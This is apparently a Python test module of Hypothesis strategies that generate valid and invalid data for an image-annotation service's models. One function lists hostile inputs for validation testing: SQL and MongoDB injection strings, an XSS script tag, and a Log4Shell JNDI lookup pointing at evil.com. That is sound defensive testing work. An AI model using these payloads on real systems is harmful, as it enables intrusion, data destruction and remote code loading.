"""Hypothesis strategies for property-based testing."""

from datetime import UTC, datetime, timedelta
from typing import Any

from bson import ObjectId
from hypothesis import strategies as st

from satin.models.annotation import AnnotationCreate, BoundingBox, ChangeType
from satin.models.base import PyObjectId
from satin.models.image import ImageCreate, ImageStatus
from satin.models.ml_job import MLJobCreate, MLJobStatus
from satin.models.tag import TagCreate


# Basic type strategies
def py_object_ids() -> st.SearchStrategy[PyObjectId]:
    """Generate valid PyObjectId instances."""
    return st.builds(PyObjectId, st.builds(ObjectId))


@st.composite
def valid_urls(draw) -> str:
    """Generate valid HTTP/HTTPS URLs."""
    scheme = draw(st.sampled_from(["http", "https"]))
    domain = draw(st.text(alphabet=st.characters(whitelist_categories=("Ll", "Nd")), min_size=3, max_size=20))
    tld = draw(st.sampled_from(["com", "org", "net", "edu", "io"]))
    path = draw(st.text(alphabet=st.characters(whitelist_categories=("Ll", "Nd", "P")), max_size=50))
    filename = draw(st.text(alphabet=st.characters(whitelist_categories=("Ll", "Nd")), min_size=1, max_size=20))
    extension = draw(st.sampled_from(["jpg", "jpeg", "png", "gif", "bmp", "webp"]))

    return f"{scheme}://{domain}.{tld}/{path}/{filename}.{extension}"


@st.composite
def safe_strings(draw, min_size: int = 0, max_size: int = 100) -> str:
    """Generate safe strings without problematic characters."""
    return draw(
        st.text(
            alphabet=st.characters(
                whitelist_categories=("Lu", "Ll", "Nd"),
                whitelist_characters=" -_.",
            ),
            min_size=min_size,
            max_size=max_size,
        )
    )


@st.composite
def dangerous_strings(draw) -> str:
    """Generate potentially dangerous strings for input validation testing."""
    dangerous_patterns = [
        # SQL injection patterns
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin'--",
        # MongoDB injection patterns
        "{'$where': 'this.password.match(/.*/)'}",
        "{'$regex': '.*'}",
        # Script injection patterns
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        # Special regex characters
        "^.*$",
        "[\\x00-\\xFF]*",
        # Unicode and emoji edge cases
        "🔥💯✨🚀",
        "\x00\x01\x02",
        "\u202e\u202d",  # Unicode direction override
        # Very long strings
        "A" * 10000,
        # Empty and whitespace
        "",
        "   ",
        "\t\n\r",
    ]
    return draw(st.sampled_from(dangerous_patterns))


# Model-specific strategies
@st.composite
def bounding_boxes(draw, max_coordinate: float = 2000.0) -> BoundingBox:
    """Generate valid bounding boxes."""
    x = draw(st.floats(min_value=0, max_value=max_coordinate - 10, allow_nan=False, allow_infinity=False))
    y = draw(st.floats(min_value=0, max_value=max_coordinate - 10, allow_nan=False, allow_infinity=False))
    max_width = max(1.0, max_coordinate - x)
    max_height = max(1.0, max_coordinate - y)
    width = draw(st.floats(min_value=1, max_value=max_width, allow_nan=False, allow_infinity=False))
    height = draw(st.floats(min_value=1, max_value=max_height, allow_nan=False, allow_infinity=False))

    return BoundingBox(x=x, y=y, width=width, height=height)


@st.composite
def invalid_bounding_boxes(draw) -> dict[str, Any]:
    """Generate invalid bounding box data for testing validation."""
    invalid_strategies = [
        # Negative coordinates
        {"x": -1, "y": 10, "width": 100, "height": 50},
        {"x": 10, "y": -1, "width": 100, "height": 50},
        # Zero or negative dimensions
        {"x": 10, "y": 10, "width": 0, "height": 50},
        {"x": 10, "y": 10, "width": 100, "height": 0},
        {"x": 10, "y": 10, "width": -10, "height": 50},
        {"x": 10, "y": 10, "width": 100, "height": -10},
        # NaN and infinity
        {"x": float("nan"), "y": 10, "width": 100, "height": 50},
        {"x": 10, "y": float("inf"), "width": 100, "height": 50},
        {"x": 10, "y": 10, "width": float("-inf"), "height": 50},
        # Missing fields
        {"x": 10, "y": 10, "width": 100},  # missing height
        {"x": 10, "width": 100, "height": 50},  # missing y
    ]
    return draw(st.sampled_from(invalid_strategies))


@st.composite
def confidence_scores(draw) -> float:
    """Generate valid confidence scores (0.0 to 1.0)."""
    return draw(st.floats(min_value=0.0, max_value=1.0, allow_nan=False, allow_infinity=False))


@st.composite
def invalid_confidence_scores(draw) -> float:
    """Generate invalid confidence scores for testing validation."""
    invalid_values = [
        -0.1,  # Below 0
        1.1,  # Above 1
        float("nan"),
        float("inf"),
        float("-inf"),
        -999.0,
        999.0,
    ]
    return draw(st.sampled_from(invalid_values))


@st.composite
def image_creates(draw) -> ImageCreate:
    """Generate valid ImageCreate instances."""
    url = draw(valid_urls())
    status = draw(st.sampled_from(list(ImageStatus)))
    width = draw(st.integers(min_value=1, max_value=10000) | st.none())
    height = draw(st.integers(min_value=1, max_value=10000) | st.none())
    ext = draw(st.sampled_from(["jpg", "jpeg", "png", "gif", "bmp", "webp"]) | st.none())

    return ImageCreate(
        url=url,
        status=status,
        width=width,
        height=height,
        ext=ext,
    )


@st.composite
def annotation_creates(draw, image_id: PyObjectId | None = None) -> AnnotationCreate:
    """Generate valid AnnotationCreate instances."""
    if image_id is None:
        image_id = draw(py_object_ids())

    bounding_box = draw(bounding_boxes())
    tags = draw(st.lists(py_object_ids(), max_size=5))
    description = draw(safe_strings(max_size=500))
    confidence = draw(st.one_of(st.none(), confidence_scores()))
    version = draw(st.integers(min_value=1, max_value=1000))
    change_type = draw(st.sampled_from(list(ChangeType)))

    return AnnotationCreate(
        image_id=image_id,
        bounding_box=bounding_box,
        tags=tags,
        description=description,
        confidence=confidence,
        version=version,
        change_type=change_type,
    )


@st.composite
def tag_creates(draw, parent_id: str | None = None) -> TagCreate:
    """Generate valid TagCreate instances."""
    name = draw(safe_strings(min_size=1, max_size=50))
    description = draw(safe_strings(max_size=200))
    color = draw(
        st.one_of(st.none(), st.text(alphabet="0123456789ABCDEF", min_size=6, max_size=6).map(lambda x: f"#{x}"))
    )

    return TagCreate(
        name=name,
        description=description,
        parent_id=parent_id,
        color=color,
    )


@st.composite
def ml_job_creates(draw) -> MLJobCreate:
    """Generate valid MLJobCreate instances."""
    image_url = draw(valid_urls())
    endpoint = draw(safe_strings(min_size=1, max_size=100))
    status = draw(st.sampled_from(list(MLJobStatus)))

    return MLJobCreate(
        image_url=image_url,
        endpoint=endpoint,
        status=status,
    )


# Time-based strategies
@st.composite
def recent_datetimes(draw) -> datetime:
    """Generate recent datetime objects."""
    now = datetime.now(UTC)
    days_ago = draw(st.integers(min_value=0, max_value=30))
    return now - timedelta(days=days_ago)


@st.composite
def old_datetimes(draw) -> datetime:
    """Generate old datetime objects for cleanup testing."""
    now = datetime.now(UTC)
    days_ago = draw(st.integers(min_value=8, max_value=365))  # At least 8 days old
    return now - timedelta(days=days_ago)


# Test data lists
@st.composite
def tag_hierarchies(draw) -> list[TagCreate]:
    """Generate hierarchical tag structures for testing."""
    # Create root tags
    root_count = draw(st.integers(min_value=1, max_value=3))
    roots = [draw(tag_creates()) for _ in range(root_count)]

    # Create children for some roots
    all_tags = roots.copy()
    for _root in roots:
        if draw(st.booleans()):  # Randomly decide if this root has children
            child_count = draw(st.integers(min_value=1, max_value=3))
            for _ in range(child_count):
                child = draw(tag_creates(parent_id="root_placeholder"))
                all_tags.append(child)

    return all_tags


@st.composite
def annotation_sequences(draw, image_id: PyObjectId) -> list[AnnotationCreate]:
    """Generate sequences of annotations for version testing."""
    count = draw(st.integers(min_value=1, max_value=5))
    annotations = []

    for i in range(count):
        annotation = draw(annotation_creates(image_id=image_id))
        annotation.version = i + 1
        annotations.append(annotation)

    return annotations
